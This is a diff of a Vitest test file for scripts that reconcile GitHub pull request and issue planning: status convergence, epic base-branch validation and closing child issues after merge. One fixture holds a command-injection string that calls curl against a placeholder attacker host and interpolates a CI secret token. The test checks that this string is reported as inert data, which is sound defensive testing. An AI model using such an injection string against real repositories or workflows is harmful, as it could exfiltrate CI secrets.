@@ -1,14 +1,19 @@
 import { describe, expect, it, vi } from 'vitest'
 
-import type { PullRequestReference } from '../scripts/project-management/issue-planning.ts'
+import type {
+  IssueReference,
+  PullRequestReference,
+} from '../scripts/project-management/issue-planning.ts'
 import type {
   NormalizedPlanningRecord,
+  PlanningConvergenceInput,
   PlanningRecordInput,
   PlanningRecordReport,
 } from '../scripts/project-management/planning-record.ts'
 import {
   reconcilePullRequestPlanning,
   reconcileReopenedIssuePlanning,
+  type IssueCompletionPort,
   type PlanningRecordReconcilerPort,
   type PullRequestPlanningPort,
 } from '../scripts/project-management/pull-request-planning.ts'
@@ -20,7 +25,9 @@ import type {
 interface FakePlanningState {
   issueState?: 'OPEN' | 'CLOSED'
   membership?: 'missing' | 'present' | 'archived'
+  kindLabel?: 'kind:epic' | 'kind:feature'
   status?: string | null
+  parent?: IssueReference | null
   linkedPullRequests?: PullRequestReference[]
   failure?: Error
 }
@@ -28,9 +35,11 @@ interface FakePlanningState {
 function pullRequest(overrides: Partial<PullRequestSnapshot> = {}): PullRequestSnapshot {
   return {
     repository: 'jarmak-personal/hvir',
-    number: 86,
+    number: 186,
     state: 'OPEN',
     isDraft: false,
+    baseRefName: 'main',
+    headRefName: 'agent/issue-10',
     body: '',
     closingIssues: [],
     ...overrides,
@@ -40,117 +49,307 @@ function pullRequest(overrides: Partial<PullRequestSnapshot> = {}): PullRequestS
 function pullRequestPort(
   snapshot: PullRequestSnapshot,
   openPullRequests: PullRequestBodySnapshot[] = [],
+  epicBranches: string[] = [],
 ): PullRequestPlanningPort {
   return {
     getPullRequest: vi.fn().mockResolvedValue(snapshot),
     listOpenPullRequestBodies: vi.fn().mockResolvedValue(openPullRequests),
+    listEpicBranches: vi.fn().mockResolvedValue(epicBranches),
   }
 }
 
-function planningPort(
-  inputStates: Record<number, FakePlanningState>,
-): PlanningRecordReconcilerPort {
+function planningPort(inputStates: Record<number, FakePlanningState>): {
+  port: PlanningRecordReconcilerPort
+  states: Map<number, FakePlanningState>
+} {
   const states = new Map(
     Object.entries(inputStates).map(([number, state]) => [Number(number), { ...state }]),
   )
+  const inspect = (issueNumber: number): PlanningRecordReport => {
+    const state = states.get(issueNumber)
+    if (state === undefined) throw new Error(`Issue #${issueNumber} was not found.`)
+    if (state.failure !== undefined) throw state.failure
+    return report(planningRecord(state, issueNumber))
+  }
   return {
-    reconcile: vi.fn().mockImplementation((input: PlanningRecordInput) => {
-      const state = states.get(input.issueNumber)
-      if (state === undefined) {
-        return Promise.reject(new Error(`Issue #${input.issueNumber} was not found.`))
-      }
-      if (state.failure !== undefined) return Promise.reject(state.failure)
-
-      const before = state.status ?? null
-      let outcome: 'unchanged' | 'would-update' | 'updated' | undefined
-      if (input.status !== undefined) {
-        const eligible =
-          state.issueState !== 'CLOSED' &&
-          (input.expectedStatus === undefined || before === input.expectedStatus)
-        if (!eligible || before === input.status) {
-          outcome = 'unchanged'
-        } else if (input.apply) {
-          state.status = input.status
-          outcome = 'updated'
-        } else {
-          outcome = 'would-update'
+    states,
+    port: {
+      reconcile: vi
+        .fn()
+        .mockImplementation((input: PlanningRecordInput) =>
+          Promise.resolve(inspect(input.issueNumber)),
+        ),
+      converge: vi.fn().mockImplementation((input: PlanningConvergenceInput) => {
+        const state = states.get(input.issueNumber)
+        if (state === undefined) {
+          return Promise.reject(new Error(`Issue #${input.issueNumber} was not found.`))
         }
-      }
-      return Promise.resolve(planningReport(input, state, before, outcome))
+        if (state.failure !== undefined) return Promise.reject(state.failure)
+        const before = state.status ?? null
+        const target =
+          state.issueState === 'CLOSED'
+            ? 'Done'
+            : input.active
+              ? 'In Progress'
+              : before === null || before === 'Done'
+                ? 'Todo'
+                : undefined
+        const operations: PlanningRecordReport['operations'] = []
+        if (state.membership !== 'present') {
+          operations.push({
+            operation: 'ensure-project',
+            outcome: input.apply ? 'added' : 'would-add',
+          })
+          if (input.apply) state.membership = 'present'
+        }
+        if (target !== undefined) {
+          const outcome =
+            before === target ? 'unchanged' : input.apply ? 'updated' : 'would-update'
+          operations.push({ operation: 'set-status', outcome, from: before, to: target })
+          if (input.apply && outcome === 'updated') state.status = target
+        }
+        return Promise.resolve({
+          ...report(planningRecord(state, input.issueNumber)),
+          apply: input.apply,
+          applied: operations.some((operation) =>
+            ['added', 'restored', 'updated'].includes(operation.outcome),
+          ),
+          operations,
+        })
+      }),
+    },
+  }
+}
+
+function completionPort(states: Map<number, FakePlanningState>): IssueCompletionPort {
+  return {
+    closeIssue: vi.fn().mockImplementation((issueNumber: number) => {
+      const state = states.get(issueNumber)
+      if (state === undefined) return Promise.reject(new Error('missing issue'))
+      state.issueState = 'CLOSED'
+      return Promise.resolve()
     }),
   }
 }
 
 describe('pull request planning lifecycle', () => {
-  it('advances Todo issues for open draft completion and contribution relationships', async () => {
+  it('advances ordinary completion and contribution targets through normal convergence', async () => {
     const pullRequests = pullRequestPort(
       pullRequest({
         isDraft: true,
         body: 'Contributes-to: #11',
         closingIssues: [issueReference(10)],
       }),
-      [openPullRequest(86, 'Contributes-to: #11')],
-    )
-    const planning = planningPort({ 10: { status: 'Todo' }, 11: { status: 'Todo' } })
-
-    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
-      pullRequestNumber: 86,
-      apply: false,
-    })
-
-    expect(report.pullRequest).toEqual({
-      repository: 'jarmak-personal/hvir',
-      number: 86,
-      state: 'OPEN',
-      draft: true,
-    })
-    expect(report.targets).toEqual([
-      expect.objectContaining({
-        issueNumber: 10,
-        relationships: ['closing'],
-        outcome: 'would-advance',
-      }),
-      expect.objectContaining({
-        issueNumber: 11,
-        relationships: ['contribution'],
-        outcome: 'would-advance',
-      }),
-    ])
-    expect(report.summary).toMatchObject({ wouldAdvance: 2, errors: 0 })
-  })
-
-  it('applies valid targets before reporting malformed and inaccessible relationships', async () => {
-    const hostile = '$(curl attacker.invalid) `${{ secrets.HVIR_PROJECT_TOKEN }}`'
-    const pullRequests = pullRequestPort(
-      pullRequest({
-        body: [
-          'Contributes-to: #10',
-          'Contributes-to: owner/repository#12',
-          'Contributes-to: #11',
-          hostile,
-        ].join('\n'),
-      }),
-      [openPullRequest(86, 'Contributes-to: #10\nContributes-to: #11')],
+      [openPullRequest(186, 'main', 'Contributes-to: #11')],
     )
     const planning = planningPort({
       10: { status: 'Todo' },
-      11: { failure: new Error('Issue #11 was not readable.') },
+      11: { membership: 'missing', status: null },
     })
 
-    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
-      pullRequestNumber: 86,
-      apply: true,
-    })
+    const result = await reconcilePullRequestPlanning(
+      pullRequests,
+      planning.port,
+      completionPort(planning.states),
+      { pullRequestNumber: 186, apply: false },
+    )
 
-    expect(report.targets).toEqual([
-      expect.objectContaining({ issueNumber: 10, outcome: 'advanced' }),
-      expect.objectContaining({ issueNumber: 11, outcome: 'failed' }),
+    expect(result.targets).toEqual([
+      expect.objectContaining({ issueNumber: 10, outcome: 'would-advance' }),
+      expect.objectContaining({ issueNumber: 11, outcome: 'would-advance' }),
     ])
-    expect(report.summary).toMatchObject({ advanced: 1, failed: 1, errors: 2 })
-    expect(JSON.stringify(report)).not.toContain(hostile)
+    expect(planning.port.converge).toHaveBeenCalledWith({
+      issueNumber: 11,
+      active: true,
+      apply: false,
+    })
+    expect(result.summary).toMatchObject({ wouldAdvance: 2, errors: 0 })
   })
 
-  it('defers a merged completion to native issue closure but preserves contributed work', async () => {
+  it('derives one parent epic and validates the exact base for an open child PR', async () => {
+    const body = 'Completes-child: #10'
+    const pullRequests = pullRequestPort(
+      pullRequest({
+        baseRefName: 'epic/50-project-delivery',
+        headRefName: 'agent/issue-10',
+        body,
+      }),
+      [openPullRequest(186, 'epic/50-project-delivery', body)],
+      ['epic/50-project-delivery'],
+    )
+    const planning = planningPort({
+      10: { status: 'Todo', parent: issueReference(50) },
+      50: { status: 'Todo', kindLabel: 'kind:epic' },
+    })
+
+    const result = await reconcilePullRequestPlanning(
+      pullRequests,
+      planning.port,
+      completionPort(planning.states),
+      { pullRequestNumber: 186, apply: false },
+    )
+
+    expect(result.completingChild).toEqual({
+      issueNumber: 10,
+      parentIssueNumber: 50,
+      expectedBase: 'epic/50-project-delivery',
+      validation: 'valid',
+      closure: 'not-applicable',
+    })
+    expect(result.targets).toEqual([
+      expect.objectContaining({
+        issueNumber: 10,
+        relationships: ['child-completion'],
+        outcome: 'would-advance',
+      }),
+      expect.objectContaining({
+        issueNumber: 50,
+        relationships: ['parent-epic'],
+        outcome: 'would-advance',
+      }),
+    ])
+  })
+
+  it('closes a direct child after its merged PR passes parent and base validation', async () => {
+    const pullRequests = pullRequestPort(
+      pullRequest({
+        state: 'MERGED',
+        baseRefName: 'epic/50-project-delivery',
+        body: 'Completes-child: #10',
+      }),
+      [],
+      ['epic/50-project-delivery'],
+    )
+    const planning = planningPort({
+      10: { status: 'In Progress', parent: issueReference(50) },
+      50: { status: 'In Progress', kindLabel: 'kind:epic' },
+    })
+    const completion = completionPort(planning.states)
+
+    const result = await reconcilePullRequestPlanning(
+      pullRequests,
+      planning.port,
+      completion,
+      { pullRequestNumber: 186, apply: true },
+    )
+
+    expect(completion.closeIssue).toHaveBeenCalledWith(10)
+    expect(result.completingChild?.closure).toBe('closed')
+    expect(planning.states.get(10)).toMatchObject({
+      issueState: 'CLOSED',
+      status: 'Done',
+    })
+    expect(result.applied).toBe(true)
+  })
+
+  it.each([
+    {
+      name: 'wrong base',
+      branches: ['epic/50-project-delivery'],
+      base: 'main',
+      diagnostic: 'base-mismatch',
+    },
+    {
+      name: 'ambiguous branch',
+      branches: ['epic/50-first', 'epic/50-second'],
+      base: 'epic/50-first',
+      diagnostic: 'ambiguous-epic-branch',
+    },
+  ])('leaves the child open for $name validation', async (fixture) => {
+    const pullRequests = pullRequestPort(
+      pullRequest({
+        state: 'MERGED',
+        baseRefName: fixture.base,
+        body: 'Completes-child: #10',
+      }),
+      [],
+      fixture.branches,
+    )
+    const planning = planningPort({
+      10: { status: 'In Progress', parent: issueReference(50) },
+      50: { status: 'In Progress', kindLabel: 'kind:epic' },
+    })
+    const completion = completionPort(planning.states)
+
+    const result = await reconcilePullRequestPlanning(
+      pullRequests,
+      planning.port,
+      completion,
+      { pullRequestNumber: 186, apply: true },
+    )
+
+    expect(completion.closeIssue).not.toHaveBeenCalled()
+    expect(planning.states.get(10)?.issueState).not.toBe('CLOSED')
+    expect(result.completingChild).toMatchObject({ validation: 'failed' })
+    expect(result.diagnostics.map((diagnostic) => diagnostic.code)).toContain(
+      fixture.diagnostic,
+    )
+  })
+
+  it('rejects a native parent that is not one open epic', async () => {
+    const pullRequests = pullRequestPort(
+      pullRequest({
+        state: 'MERGED',
+        baseRefName: 'epic/50-project-delivery',
+        body: 'Completes-child: #10',
+      }),
+      [],
+      ['epic/50-project-delivery'],
+    )
+    const planning = planningPort({
+      10: { status: 'In Progress', parent: issueReference(50) },
+      50: { status: 'In Progress', kindLabel: 'kind:feature' },
+    })
+    const completion = completionPort(planning.states)
+
+    const result = await reconcilePullRequestPlanning(
+      pullRequests,
+      planning.port,
+      completion,
+      { pullRequestNumber: 186, apply: true },
+    )
+
+    expect(completion.closeIssue).not.toHaveBeenCalled()
+    expect(result.diagnostics).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ code: 'parent-not-epic', issueNumber: 50 }),
+      ]),
+    )
+  })
+
+  it('treats an already closed child as an idempotent merged-event replay', async () => {
+    const pullRequests = pullRequestPort(
+      pullRequest({
+        state: 'MERGED',
+        baseRefName: 'epic/50-project-delivery',
+        body: 'Completes-child: #10',
+      }),
+      [],
+      ['epic/50-project-delivery'],
+    )
+    const planning = planningPort({
+      10: {
+        issueState: 'CLOSED',
+        status: 'Done',
+        parent: issueReference(50),
+      },
+      50: { status: 'In Progress', kindLabel: 'kind:epic' },
+    })
+    const completion = completionPort(planning.states)
+
+    const result = await reconcilePullRequestPlanning(
+      pullRequests,
+      planning.port,
+      completion,
+      { pullRequestNumber: 186, apply: true },
+    )
+
+    expect(completion.closeIssue).not.toHaveBeenCalled()
+    expect(result.completingChild?.closure).toBe('unchanged')
+    expect(result.summary.errors).toBe(0)
+  })
+
+  it('defers merged native completion while preserving contributed work', async () => {
     const pullRequests = pullRequestPort(
       pullRequest({
         state: 'MERGED',
@@ -160,274 +359,81 @@ describe('pull request planning lifecycle', () => {
     )
     const planning = planningPort({ 11: { status: 'Todo' } })
 
-    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
-      pullRequestNumber: 86,
-      apply: true,
-    })
+    const result = await reconcilePullRequestPlanning(
+      pullRequests,
+      planning.port,
+      completionPort(planning.states),
+      { pullRequestNumber: 186, apply: true },
+    )
 
-    expect(report.targets).toEqual([
+    expect(result.targets).toEqual([
       {
         issueNumber: 10,
         relationships: ['closing'],
         outcome: 'unchanged',
         reason: 'completion-merge-deferred',
       },
-      expect.objectContaining({
-        issueNumber: 11,
-        outcome: 'advanced',
-        statusAfter: 'In Progress',
-      }),
-    ])
-    expect(planning.reconcile).not.toHaveBeenCalledWith(
-      expect.objectContaining({ issueNumber: 10 }),
-    )
-  })
-
-  it('recomputes removed contributions without regressing status', async () => {
-    const pullRequests = pullRequestPort(pullRequest({ state: 'CLOSED' }), [
-      openPullRequest(90, 'Contributes-to: #10'),
-    ])
-    const planning = planningPort({
-      10: { status: 'Todo' },
-      11: { status: 'In Progress' },
-    })
-
-    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
-      pullRequestNumber: 86,
-      previousBody: 'Contributes-to: #10\nContributes-to: #11',
-      apply: false,
-    })
-
-    expect(report.relationships.removedContribution).toEqual([10, 11])
-    expect(report.targets).toEqual([
-      expect.objectContaining({
-        issueNumber: 10,
-        outcome: 'would-advance',
-        relationships: ['removed-contribution'],
-      }),
-      expect.objectContaining({
-        issueNumber: 11,
-        outcome: 'unchanged',
-        reason: 'no-active-relationship',
-        statusAfter: 'In Progress',
-      }),
+      expect.objectContaining({ issueNumber: 11, outcome: 'advanced' }),
     ])
   })
 
-  it('finds another active native completion when the triggering relationship is inactive', async () => {
-    const pullRequests = pullRequestPort(pullRequest({ state: 'CLOSED' }), [])
-    const planning = planningPort({
-      10: {
-        status: 'Todo',
-        linkedPullRequests: [
-          {
-            repository: 'jarmak-personal/hvir',
-            number: 90,
-            state: 'OPEN',
-            mergedAt: null,
-            relationship: 'closing',
-          },
-        ],
-      },
-    })
-
-    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
-      pullRequestNumber: 86,
-      previousBody: 'Contributes-to: #10',
-      apply: false,
-    })
-
-    expect(report.targets[0]).toMatchObject({
-      issueNumber: 10,
-      outcome: 'would-advance',
-    })
-  })
-
-  it('does not guess transitions for closed, non-Todo, missing, or archived issues', async () => {
-    const body = [10, 11, 12, 13, 14, 15]
-      .map((number) => `Contributes-to: #${number}`)
-      .join('\n')
-    const pullRequests = pullRequestPort(pullRequest({ body }), [
-      openPullRequest(86, body),
-    ])
-    const planning = planningPort({
-      10: { status: 'In Progress' },
-      11: { status: 'Done' },
-      12: { status: null },
-      13: { issueState: 'CLOSED', status: 'Todo' },
-      14: { membership: 'missing', status: null },
-      15: { membership: 'archived', status: 'Todo' },
-    })
-
-    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
-      pullRequestNumber: 86,
-      apply: true,
-    })
-
-    expect(
-      report.targets.map(({ issueNumber, outcome, reason }) => ({
-        issueNumber,
-        outcome,
-        reason,
-      })),
-    ).toEqual([
-      { issueNumber: 10, outcome: 'unchanged', reason: 'status-not-todo' },
-      { issueNumber: 11, outcome: 'unchanged', reason: 'status-not-todo' },
-      { issueNumber: 12, outcome: 'unchanged', reason: 'status-not-todo' },
-      { issueNumber: 13, outcome: 'unchanged', reason: 'issue-closed' },
-      { issueNumber: 14, outcome: 'failed', reason: 'missing-project-item' },
-      { issueNumber: 15, outcome: 'failed', reason: 'archived-project-item' },
-    ])
-    expect(report.summary).toMatchObject({ unchanged: 4, failed: 2, errors: 2 })
-  })
-
-  it('uses completion precedence and reports cross-repository and duplicate metadata', async () => {
+  it('reports hostile malformed metadata as data while applying valid targets', async () => {
+    const hostile = '$(curl attacker.invalid) `${{ secrets.HVIR_PROJECT_TOKEN }}`'
     const pullRequests = pullRequestPort(
       pullRequest({
-        body: 'Contributes-to: #10\nContributes-to: #10',
-        closingIssues: [issueReference(10), issueReference(12, 'another/repository')],
+        body: [
+          'Contributes-to: #10',
+          'Contributes-to: owner/repository#12',
+          hostile,
+        ].join('\n'),
       }),
-      [openPullRequest(86, 'Contributes-to: #10')],
+      [openPullRequest(186, 'main', 'Contributes-to: #10')],
     )
     const planning = planningPort({ 10: { status: 'Todo' } })
 
-    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
-      pullRequestNumber: 86,
-      apply: false,
-    })
+    const result = await reconcilePullRequestPlanning(
+      pullRequests,
+      planning.port,
+      completionPort(planning.states),
+      { pullRequestNumber: 186, apply: true },
+    )
 
-    expect(report.targets[0]).toMatchObject({
-      issueNumber: 10,
-      relationships: ['closing', 'contribution'],
-      outcome: 'would-advance',
-    })
-    expect(report.diagnostics.map((diagnostic) => diagnostic.code)).toEqual([
-      'duplicate-trailer',
-      'cross-repository-completion',
-      'redundant-relationship',
-    ])
+    expect(result.targets[0]).toMatchObject({ issueNumber: 10, outcome: 'advanced' })
+    expect(result.summary.errors).toBe(1)
+    expect(JSON.stringify(result)).not.toContain(hostile)
   })
 
-  it('reports a concurrent state change instead of overwriting it', async () => {
-    const pullRequests = pullRequestPort(pullRequest({ body: 'Contributes-to: #10' }), [
-      openPullRequest(86, 'Contributes-to: #10'),
-    ])
-    const first = planningReport(
-      { issueNumber: 10, ensureProject: false, apply: false },
-      { status: 'Todo' },
-      'Todo',
-      undefined,
-    )
-    const changed = planningReport(
-      {
-        issueNumber: 10,
-        ensureProject: false,
-        status: 'In Progress',
-        expectedStatus: 'Todo',
-        openOnly: true,
-        apply: true,
-      },
-      { status: 'Done' },
-      'Done',
-      'unchanged',
-    )
-    const planning: PlanningRecordReconcilerPort = {
-      reconcile: vi.fn().mockResolvedValueOnce(first).mockResolvedValueOnce(changed),
-    }
-
-    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
-      pullRequestNumber: 86,
-      apply: true,
-    })
-
-    expect(planning.reconcile).toHaveBeenLastCalledWith({
-      issueNumber: 10,
-      ensureProject: false,
-      status: 'In Progress',
-      expectedStatus: 'Todo',
-      openOnly: true,
-      apply: true,
-    })
-    expect(report.targets[0]).toMatchObject({
-      outcome: 'unchanged',
-      reason: 'concurrent-state-change',
-      statusAfter: 'Done',
-    })
-  })
-
-  it('recomputes active relationships when an issue is reopened', async () => {
+  it('recomputes contribution and completing-child activity when an issue reopens', async () => {
     const pullRequests = pullRequestPort(pullRequest(), [
-      openPullRequest(90, 'Contributes-to: #10'),
+      openPullRequest(190, 'epic/50-project-delivery', 'Completes-child: #10'),
     ])
     const planning = planningPort({ 10: { status: 'Todo' } })
 
-    const report = await reconcileReopenedIssuePlanning(pullRequests, planning, {
+    const result = await reconcileReopenedIssuePlanning(pullRequests, planning.port, {
       repository: 'jarmak-personal/hvir',
       issueNumber: 10,
       apply: true,
     })
 
-    expect(report).toMatchObject({
-      applied: true,
-      issue: { repository: 'jarmak-personal/hvir', number: 10 },
-      target: {
-        issueNumber: 10,
-        outcome: 'advanced',
-        reason: 'active-relationship',
-        statusAfter: 'In Progress',
-      },
-      summary: { advanced: 1, errors: 0 },
-    })
-    expect(pullRequests.getPullRequest).not.toHaveBeenCalled()
-  })
-
-  it('leaves a reopened Todo issue alone when no explicit relationship is active', async () => {
-    const pullRequests = pullRequestPort(pullRequest(), [])
-    const planning = planningPort({ 10: { status: 'Todo' } })
-
-    const report = await reconcileReopenedIssuePlanning(pullRequests, planning, {
-      repository: 'jarmak-personal/hvir',
+    expect(result.target).toMatchObject({
       issueNumber: 10,
-      apply: true,
-    })
-
-    expect(report.target).toMatchObject({
-      outcome: 'unchanged',
-      reason: 'no-active-relationship',
-      statusAfter: 'Todo',
+      outcome: 'advanced',
+      reason: 'active-relationship',
+      statusAfter: 'In Progress',
     })
   })
 })
 
-function planningReport(
-  input: PlanningRecordInput,
-  state: FakePlanningState,
-  from: string | null,
-  outcome: 'unchanged' | 'would-update' | 'updated' | undefined,
-): PlanningRecordReport {
-  const record = planningRecord(state, input.issueNumber)
-  return {
-    apply: input.apply,
-    applied: outcome === 'updated',
-    record,
-    operations:
-      input.status === undefined || outcome === undefined
-        ? []
-        : [
-            {
-              operation: 'set-status',
-              outcome,
-              from,
-              to: input.status,
-            },
-          ],
-  }
+function report(record: NormalizedPlanningRecord): PlanningRecordReport {
+  return { apply: false, applied: false, record, operations: [] }
 }
 
 function planningRecord(
   state: FakePlanningState,
   issueNumber: number,
 ): NormalizedPlanningRecord {
+  const kindLabel = state.kindLabel ?? 'kind:feature'
+  const kindOption = kindLabel === 'kind:epic' ? 'Epic' : 'Feature'
   return {
     repository: 'jarmak-personal/hvir',
     issue: {
@@ -435,18 +441,18 @@ function planningRecord(
       state: state.issueState ?? 'OPEN',
       kind: {
         state: 'valid',
-        label: 'kind:feature',
-        option: 'Feature',
-        recognizedLabels: ['kind:feature'],
+        label: kindLabel,
+        option: kindOption,
+        recognizedLabels: [kindLabel],
       },
       areas: [],
-      parent: null,
+      parent: state.parent ?? null,
       subIssues: [],
       linkedPullRequests: state.linkedPullRequests ?? [],
     },
     project: {
       membership: state.membership ?? 'present',
-      kind: 'Feature',
+      kind: kindOption,
       status: state.status ?? null,
     },
   }
@@ -455,10 +461,20 @@ function planningRecord(
 function issueReference(
   number: number,
   repository = 'jarmak-personal/hvir',
-): PullRequestSnapshot['closingIssues'][number] {
+): IssueReference {
   return { repository, number, state: 'OPEN' }
 }
 
-function openPullRequest(number: number, body: string): PullRequestBodySnapshot {
-  return { repository: 'jarmak-personal/hvir', number, body }
+function openPullRequest(
+  number: number,
+  baseRefName: string,
+  body: string,
+): PullRequestBodySnapshot {
+  return {
+    repository: 'jarmak-personal/hvir',
+    number,
+    baseRefName,
+    headRefName: `agent/pr-${number}`,
+    body,
+  }
 }
